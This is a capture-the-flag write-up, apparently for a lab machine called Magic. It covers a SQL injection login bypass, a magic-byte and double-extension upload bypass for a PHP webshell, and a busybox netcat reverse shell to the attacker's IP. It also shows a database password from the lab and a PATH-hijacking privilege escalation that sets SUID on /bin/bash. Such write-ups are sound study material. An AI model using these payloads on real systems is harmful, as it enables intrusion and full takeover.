#box #SQLi #file-upload-bypass #magic-bytes #chisel #proxychains #mysql #credentials #strace #path-abuse
1. The machine shows a website hosting a few images on it. On the bottom right we discover a link to a login page
2. Landing on the login page we immediately try a basic SQLi payload, discovering that the application can be bypassed with a SQLi payload
```sql
-- the space is mandatory after the last '-'
1' or 1=1 -- - 
```
![[attachments/magic-1.png]]
3. Once we're in we discover we can upload a file. After some tests we discover the following:
	1. Only images files JPEG, JPG or PNG are allowed
	2. The checks seems to impact the file extensions
	3. The checks seems not to care about the mime type
	4. The checks seems to detect a non-image file passed with an image extension (i.e passing a php webshell with a `.png` extension, for instance)
   To bypass that check, we consider to create a file with a magic bytes prefix first.
   Then, we play around with the file extension validating that the check only validates that the file ends with one of those extensions. This permits us to use a Double Extension bypass providing a file named `shell.php.jpg` that will still execute our php payload but will be recognized as a valid image
![[attachments/magic-2.png]]
4. Within some enumeration, we also discover that the upload folder seems to be located at `/images/uploads`. In fact, performing a curl request at `http://10.129.5.194/images/uploads/warlock.php.png` will confirm we have a webshell on it
![[attachments/magic-3.png]]
5. At this point, we can get a reverse shell with a basic busybox reverse shell
```sh
curl "http://10.129.5.194/images/uploads/warlock.php.png?cmd=busybox%20nc%2010.10.16.55%204444%20-e%20bash"
```
6. Once landed on the machine, we discover the presence of a `db.php5` file at `/var/www/Magic`. By printing it we reveal the credentials of the user `theseus` for the database. Since we cannot connect to mysql on the target's end (because `mysql` is missing and we couldn't find neither `mariadb` nor `psql`) we opt to download chisel (with `wget` or `nc` since `curl` is not present on the machine) on the machine and perform a Reverse Pivot connection to be able to connect in `mysql` from our attacking machine
```sh
proxychains mysql -u theseus -p -h 127.0.0.1
```

>IppSec used `mysqldump` which is an utility to dump a database once the given credentials are given accordingly. I didn't know about that
6. Inside the database, we discover a database named `Magic` and a table named `login`. Inside of it a password: `Th3s3usW4sK1ng`
![[attachments/magic-4.png]]
7. After checking the `/etc/passwd` we discover the presence of a shell user named `theseus`. We opt to try authenticate with `su` and `theseus:Th3s3usW4sK1ng` gaining a shell with that user
8. Inside of `theseus`, the SUID command discovers us an unusual binary located at `/bin/sysinfo`. This binary catches our eye because our `id` tells us that our user belongs to the `users` group and this binary has a SGID on the `users group
![[attachments/magic-5.png]]
9. After checking with IppSec's review we discover `strace`. This binary is useful to debug a linux binary. So, recalling this binary with `strace` will basically tell us all the system call this binary is making at runtime. After reviewing the binary carefully we discover the system call it makes. (we must use `-f` which stands for "follow forks" to properly understand all recursive recalls the binary makes)
```sh
strace -f sysinfo
```
10. After looking at the file we discover the following interesting pieces
```txt
execve("/bin/sysinfo", ["sysinfo"], 0x7ffda53fcbe8 /* 26 vars */) = 0

....

[pid  2077] execve("/bin/sh", ["sh", "-c", "lshw -short"], 0x7ffff6c5f3d8 /* 26 vars */ <unfinished ...>

....

[pid  2078] execve("/usr/bin/lshw", ["lshw", "-short"], 0x56542248cb68 /* 26 vars */) = 0

....

[pid  2079] execve("/bin/sh", ["sh", "-c", "fdisk -l"], 0x7ffff6c5f3d8 /* 26 vars */) = 0

....

[pid  2080] execve("/sbin/fdisk", ["fdisk", "-l"], 0x562c118adb68 /* 26 vars */) = 0

....

[pid  2081] execve("/bin/sh", ["sh", "-c", "cat /proc/cpuinfo"], 0x7ffff6c5f3d8 /* 26 vars */) = 0

....

[pid  2082] execve("/bin/cat", ["cat", "/proc/cpuinfo"], 0x56052cb19b78 /* 26 vars */) = 0

....

[pid  2083] execve("/bin/sh", ["sh", "-c", "free -h"], 0x7ffff6c5f3d8 /* 26 vars */ <unfinished ...>

....

[pid  2084] execve("/usr/bin/free", ["free", "-h"], 0x560a5fe33b68 /* 26 vars */) = 0
```
11. From this log we understand that there are a lot of binaries being recalled with a relative path. This should permit us to perform a PATH Abuse attack. First, we export the current directory to PATH
```sh
PATH=.:${PATH}
export PATH
echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
12. Then, we create a `free` binary, since this binary is one of the binaries mentioned above with a relative path inside our current folder. This binary will simply create a folder named `test` inside `/tmp/`
```sh
echo -n -e '#!/bin/bash\nmkdir /tmp/test' > free
chmod +x free
cat free

#!/bin/bash
mkdir /tmp/test
```
13. Finally, we'll execute `/bin/sysinfo` to check whether this binary is being recalled and if our PATH Abuse is working, validating that it's working:
![[attachments/magic-6.png]]
14. Finally, we can set a SUID to `/bin/bash`
```sh
echo -n -e '#!/bin/bash\nchmod 4777 /bin/bash' > free
chmod +x free
cat free

#!/bin/bash
chmod 4777 /bin/bash
```
15. And now, after recalling once again `/bin/sysinfo` we can validate our `/bin/bash` binary has a SUID set and we can now escalate to root with `/bin/bash -p`
![[attachments/magic-7.png]]